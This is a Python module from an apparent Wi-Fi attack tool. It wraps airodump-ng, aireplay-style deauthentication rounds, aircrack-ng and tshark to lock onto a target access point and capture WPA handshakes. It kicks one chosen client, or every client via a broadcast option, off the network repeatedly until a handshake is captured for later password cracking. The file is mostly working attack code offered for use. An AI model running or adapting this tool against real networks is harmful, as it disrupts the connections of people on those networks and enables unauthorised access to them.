

from dataclasses import dataclass
import glob
import os
import re
import subprocess
import sys
import tempfile
import time
from typing import Optional

from .deauth import DeauthRound, decide_round, lock_channel, pick_station_with_wait, run_deauth_round, stop_deauth_round
from wifi_infra.errors import WifiHackingToolError
from wifi_infra.iface import require_monitor_mode
from wifi_infra.runner import run_command, start_process
from .scan import scan_command
from wifi_infra.utils import require_linux
from wifi_infra.parse import _looks_like_mac, _to_int


_PACKETS_RE = re.compile(r"Read\s+(\d+)\s+packets", re.IGNORECASE)
_AP_LINE_RE = re.compile(
    r"^\s*\d+\s+"
    r"(?P<bssid>(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+"
    r".*?"
    r"(?:WPA\s*\(\s*(?P<n>\d+)\s+handshake\s*\)|Unknown)",
    re.IGNORECASE,
)

# 启动 airodump 之后，等它产出可用 .cap 的最长时间（秒）
#
# ★ 为什么是 20 秒而不是 3 秒（2026-10-14 实测）：
#     紧接在 findChannel() 那次扫描之后启动 airodump 时，
#     接口要先从上一个 airodump 手里释放 —— 实测启动被拖到约 7 秒。
#     3 秒会误报"没有生成 .cap"，而失败留下的目录里 .cap 最后长到了 14KB。
#   对照：接口干净时直接跑 airodump，.cap 只要 100~200ms。
READY_TIMEOUT = 20.0

_TSHARK_HEALTH: Optional[bool] = None      # 模块级，只查一次

@dataclass
class CaptureResults:
    bssid: str # mac
    channel: int #信道
    cap_path: str
    handshakes: int # 抓了多少握手数
    packets: int # 抓了多少包
    duration: float

    @property
    def got_handshake(self) -> bool:
        return self.handshakes > 0


@dataclass
class CapStats:
    packets: int
    handshakes: int


def findChannel(bssid: str, iface: str, duration: int = 10) -> int:
    """scan 一遍, 获取这个 BSSID 的 channel"""
    result = scan_command(iface, duration=duration)
    for ap in result.aps:
        if getattr(ap, "bssid") == bssid:
            ch = getattr(ap, "channel", None)
            if ch:
                return ch

    # 没有找到
    raise WifiHackingToolError(
        f"找不到 BSSID 为 {bssid} 的 AP （可能不在范围内/已换信道）", return_code=2
    )


def check_stats(cap_path: str, bssid: str) -> Optional[CapStats]:
    """检查 cap 包，返回握手数和包数"""
    if not os.path.exists(cap_path):
        return None

    if os.path.getsize(cap_path) == 0:
        return None

    # aircrack-ng <cap> 等待输入，但是 start_process 的 subprocess 已经设置为 stdin=subprocess.DEVNULL, 因此无影响
    packets = 0
    argv = [
        'aircrack-ng',
        cap_path
    ]
    result = run_command(argv, timeout=10)
    text = result.stdout or ""

    # 解析包数
    if not text:
        raise WifiHackingToolError(f"aircrack-ng 失败: {result.error}", return_code=3)
    else:
        packets = parse_packets(text)

    # 解析握手数
    handshakes = parse_handshakes(text, bssid) if text else 0
    if handshakes == 0 or handshakes is None:
        h = parse_handshakes_tshark(cap_path, bssid)
        if h is not None:
            handshakes = h


    return CapStats(packets=packets, handshakes=handshakes)




def parse_handshakes(text: str, bssid: str) -> int:
    """解析 aircrack-ng 的输出，返回握手数, tshark不可用时的方案，但这个方案一般不可行，因为bssid的指定"""

    target_bssid = bssid.lower()
    for line in text.splitlines():
        handshakes = _AP_LINE_RE.match(line)
        if not handshakes:
            continue
        if handshakes.group("bssid").lower() != target_bssid:
            continue
        handshakes_num = handshakes.group("n")
        return int(handshakes_num) if handshakes_num else 0
    return 0


def parse_packets(text: str) -> int:
    """解析 aircrack-ng 的输出，返回包数"""
    for line in text.splitlines():
        packets = _PACKETS_RE.search(line)
        if packets:
            return int(packets.group(1))
    return 0


def _probe_tshark(binary: str = "tshark", timeout: float = 8.0) -> bool:
    """tshark 不只是'存在'，还要能正常工作。

    实测坑：Kali 上 libwireshark-data(4.6.4) 与 tshark(4.4.9) 版本不一致时，
    tshark 每次调用都报 "Dissector bug" 并吐协议注册表垃圾，但退出码仍是 0
    —— 于是数出 0、返回 0（而不是 None），调用方永远不退回 aircrack-ng 解析。
    """
    try:
        p = subprocess.run([binary, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.DEVNULL, text=True, encoding="utf-8",
                           errors="replace", timeout=timeout)
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        return False
    blob = (p.stdout or "") + (p.stderr or "")
    return "Dissector bug" not in blob and "tshark" in blob.lower()


def _tshark_healthy(binary: str = "tshark", timeout: float = 8.0) -> bool:
    global _TSHARK_HEALTH
    if _TSHARK_HEALTH is None:
        _TSHARK_HEALTH = _probe_tshark(binary, timeout)
    return _TSHARK_HEALTH


def parse_handshakes_tshark(cap_path: str, bssid: str) -> Optional[int]:
    """用 tshark 数这个 BSSID 的 EAPOL 帧。"""
    if not _tshark_healthy():
        return None
    argv = [
        'tshark', '-r', cap_path, '-Y', f"eapol && wlan.bssid == {bssid.lower()}", "-T", "fields", 
        "-e", "wlan.sa", "-e", "wlan.da"
    ]
    try:
        """
        输出类似:
        aa:bb:cc:dd:ee:ff    11:22:33:44:55:66
        11:22:33:44:55:66    aa:bb:cc:dd:ee:ff
        aa:bb:cc:dd:ee:ff    11:22:33:44:55:66
        11:22:33:44:55:66    aa:bb:cc:dd:ee:ff
        """
        proc = subprocess.Popen(
            argv,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            text=True, encoding="utf-8", errors="replace"
        )
    except Exception as e:
        print(f"tshark 启动失败: {e}", file=sys.stderr)
        return None

    try:
        paired, _, _ = _count_eapol_lines(proc.stdout, bssid)
        return paired
    except Exception as e:
        print(f"tshark 解析失败: {e}", file=sys.stderr)
        return None
    finally:
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


def _count_eapol_lines(lines, bssid: str) -> tuple:
    """统计 EAPOL 包数，返回 (握手数, 发包数, 收包数)"""
    target = bssid.lower()
    from_ap = from_sta = 0

    for line in lines:
        parts = [p.strip().lower() for p in line.split("\t")]
        if len(parts) < 2:
            continue
        sa, da = parts[0], parts[1]
        if da == target and _looks_like_mac(sa):
            from_sta += 1
        elif sa == target and _looks_like_mac(da):
            from_ap += 1

    paired = min(from_ap, from_sta) if (from_ap and from_sta) else 0
    return paired, from_ap, from_sta

def _list_caps(output_dir: str, prefix_name: str = "cap") -> set:
    return {os.path.basename(p)
            for p in glob.glob(os.path.join(output_dir, f"{prefix_name}-*.cap"))}


def _new_cap(output_dir: str, before: set, prefix_name: str = "cap") -> Optional[str]:
    """从"本次新增"的 .cap 里挑一个（取编号最大的那个）。"""
    now = _list_caps(output_dir, prefix_name)
    fresh = sorted(now - before)
    return os.path.join(output_dir, fresh[-1]) if fresh else None

def _cap_ready(path: str) -> bool:
    """pcap 头 24 字节。读到魔数才算真的开始写了。"""
    try:
        with open(path, "rb") as f:
            magic = f.read(4)
    except OSError:
        return False
    return magic in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4",
                     b"\x4d\x3c\xb2\xa1", b"\xa1\xb2\x3c\x4d")

def capture_command(
    bssid: str,  # 目标网络的BSSID（MAC地址）
    iface: str,  # 使用的网络接口
    channel: Optional[int] = None,  # 目标信道，如果为None则自动查找
    output_dir: Optional[str] = None,
    duration: int = 60,
    poll_interval: float = 2.0,
    # ---- 新增 deauth 参数  ----
    deauth: bool = False,
    station: Optional[str] = None, # None为自动选, all为广播
    count: int = 5
) -> CaptureResults:
    """
    锁信道抓包，边抓边查握手，抓到就停。

    - channel 为 None -> 先扫一遍自动查
    - output_dir 为 None -> 用 tempfile.mkdtemp
    - 返回 CaptureResults, 路径已打印由调用方决定
    """
    require_linux("airodump-ng")
    require_monitor_mode(iface)

    if channel is None:
        channel = findChannel(bssid, iface)

    if output_dir is None:
        output_dir = tempfile.mkdtemp(prefix="WifiHackingTool-cap-")


    os.makedirs(output_dir, exist_ok=True)
    prefix = os.path.join(output_dir, "cap")

    argv = [
        'airodump-ng',
        '-c', str(channel),
        '--bssid', bssid,
        '-w', prefix,
        '--output-format', 'pcap,csv', # 同时写csv, 供后面获取station
        iface
    ]
    #   启动前先拍快照：之后只认"新增"的 .cap
    #   否则复用 --out 目录时，起手那一刻唯一非空的候选就是上一轮的旧文件
    caps_before = _list_caps(output_dir, "cap")

    handler = start_process(argv)
    if handler.proc is None:
        raise WifiHackingToolError(
            f"启动 airodump-ng 失败: [{handler.error}]", return_code=3
        )

    # ★ 等 .cap 出现：最多 20 秒，并且等待期间要有进度
    #
    #   为什么不是 3 秒（实测教训，2026-10-14）：
    #     紧接在 findChannel() 那次扫描之后启动 airodump 时，
    #     接口要先从上一个 airodump 手里释放 —— 实测启动被拖到约 7 秒。
    #     3 秒会误报"没有生成 .cap"，而两次失败留下的目录里，
    #     cap-01.cap 最后长到了 14413B / 6537B（airodump 其实起来了）。
    #   对照：接口干净时直接跑 airodump，.cap 只要 100~200ms。
    #
    #   ★ 判据用 _cap_ready()（读 pcap 魔数），不要用 os.path.getsize() > 0：
    #     .cap 出现后会在 0 字节上停留（airodump 用户态缓冲还没 flush），
    #     实测最长停留 1.8 秒。
    cap_path = None
    deadline = time.time() + READY_TIMEOUT
    waited = 0.0
    while time.time() < deadline:
        cap_path = _new_cap(output_dir, caps_before, "cap")
        if cap_path and _cap_ready(cap_path):
            break
        if handler.poll():
            raise WifiHackingToolError(
                f"airodump-ng 启动后立即崩溃: [{handler.error}]; {output_dir} 里没有可用的 .cap",
                return_code=1,
            )
        waited = READY_TIMEOUT - (deadline - time.time())
        print(
            f"\r[等待] airodump-ng 正在初始化… {waited:4.1f}s / {READY_TIMEOUT:.0f}s",
            end="", file=sys.stderr, flush=True,
        )
        time.sleep(0.2)

    # 等到了就清掉那一行进度，避免和后面的 [capture] 进度行挤在一起
    print("\r" + " " * 48 + "\r", end="", file=sys.stderr, flush=True)

    if cap_path is None:
        raise WifiHackingToolError(
            f"airodump-ng 在 {READY_TIMEOUT:.0f} 秒内没有生成可用的 .cap（目录 {output_dir}）\n"
            f"  常见原因与对策：\n"
            f"    1) 接口刚被上一个 airodump 占用（本工具在查信道时会先扫一次）\n"
            f"       → 加 --channel <N> 跳过前置扫描，少一次接口争用\n"
            f"    2) 网卡射频没在收帧\n"
            f"       → 体检：读两次 /sys/class/net/{iface}/statistics/rx_packets，不涨就是射频死了\n"
            f"       → 物理重插网卡（RT5370 的 USB 会挂起，dmesg 里能看到 "
            f"rt2x00usb_vendor_request ... error -110）\n"
            f"    3) 网卡不在 monitor 模式\n"
            f"       → wifitool iface monitor start {iface}",
            return_code=1,
        )

    """
    deauth 部分, 在 cap 文件生成之后强制客户端下播重连, 从而获取握手包
    """
    rounds_done = 1
    current_round: Optional[DeauthRound] = None
    try:
        if deauth:
            # 锁信道
            lock_channel(iface, channel)

            # 找目标station
            if station is None:
                csv_path = os.path.splitext(cap_path)[0] + ".csv"
                station = pick_station_with_wait(csv_path, bssid, timeout=10.0)
                if station is None:
                    raise WifiHackingToolError(
                        f"{bssid} 下没有可见的客户端（等了 10 秒）。\n"
                        f"  → 等等再试（让客户端先发点数据）\n"
                        f"  → 或者显式指定：--station <MAC>\n"
                        f"  → 或者用广播：--station all（会踢这个 AP 下所有人）",
                        return_code=2,
                    )

            # 第一轮
            current_round = run_deauth_round(iface, bssid, channel, station, count, rounds_done)

            last_kick_at = time.time()
            print(f"\n[deauth] 第 {rounds_done} 轮：{' '.join(current_round.argv)}", file=sys.stderr)

        start_time = time.time()
        packets = 0
        handshakes = 0
        try:
            while True:
                elapsed = time.time() - start_time
                if elapsed > duration:
                    break

                print(
                    f"\r[capture] {bssid} ch={channel} "
                    f"{elapsed:5.1f}s / {duration}s  "
                    f"packets={packets}  handshakes={handshakes}",
                    end="", flush=True,
                )

                # 下一次刷新检查 cap 包前，sleep 多久
                time.sleep(min(poll_interval, max(0.2, duration - elapsed)))

                # 进程停了
                if handler.poll():
                    break

                try:
                    # 检查 cap 包
                    stats = check_stats(cap_path, bssid)
                    if stats is not None:
                        packets, handshakes = stats.packets, stats.handshakes
                except WifiHackingToolError as e:
                    print(f"\r[capture] {e}", file=sys.stderr)

                if handshakes > 0:
                    break

                # deauth 模式下，决定要不要再踢一轮
                if deauth:
                    since_last = time.time() - last_kick_at
                    decision = decide_round(rounds_done, since_last, elapsed, handshakes, duration)
                    if decision == "deauth-again":
                        stop_deauth_round(current_round)
                        rounds_done += 1
                        current_round = run_deauth_round(iface, bssid, channel, station, count, rounds_done)

                        last_kick_at = time.time()
                        print(f"\n[deauth] 第 {rounds_done} 轮：{' '.join(current_round.argv)}", file=sys.stderr)
                        

        except Exception as e:
            print(f"\r[capture] {e}", file=sys.stderr)


    except KeyboardInterrupt:
        print("\n[capture] 收到 Ctrl-C，收尾中...", file=sys.stderr)
    finally:
        stop_deauth_round(current_round)
        handler.terminate()
        print()

    elapsed = time.time() - start_time
    # 再判断一次，防止进程异常退出
    try:
        stats = check_stats(cap_path, bssid)
        if stats is not None:
            packets, handshakes = stats.packets, stats.handshakes
    except WifiHackingToolError:
        pass          # 收尾统计失败：保留上一轮的值，不要吞掉别的异常

    return CaptureResults(
        bssid=bssid,
        channel=channel,
        cap_path=cap_path,
        handshakes=handshakes,
        packets=packets,
        duration=elapsed,
    )
